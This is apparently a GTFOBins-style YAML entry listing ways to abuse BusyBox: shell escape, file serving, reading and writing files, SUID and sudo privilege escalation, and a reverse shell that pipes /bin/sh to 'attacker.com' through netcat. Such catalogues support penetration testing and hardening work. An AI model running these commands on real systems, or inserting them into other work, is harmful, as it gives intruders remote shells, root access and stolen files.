---
description: BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example.
functions:
  shell:
    - code: busybox sh
  file-upload:
    - description: Serve files in the local folder running an HTTP server.
      code: |
        LPORT=12345
        busybox httpd -f -p $LPORT -h .
  file-write:
    - code: |
        LFILE=file_to_write
        busybox sh -c 'echo "DATA" > $LFILE'
  file-read:
    - code: |
        LFILE=file_to_read
        ./busybox cat "$LFILE"
  suid:
    - description: It may drop the SUID privileges depending on the compilation flags and the runtime configuration.
      code: "./busybox sh"
  sudo:
    - code: sudo busybox sh
  reverse-shell:
    - description: Run `nc -lvp 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        busybox nc -e /bin/sh $RHOST $RPORT
---
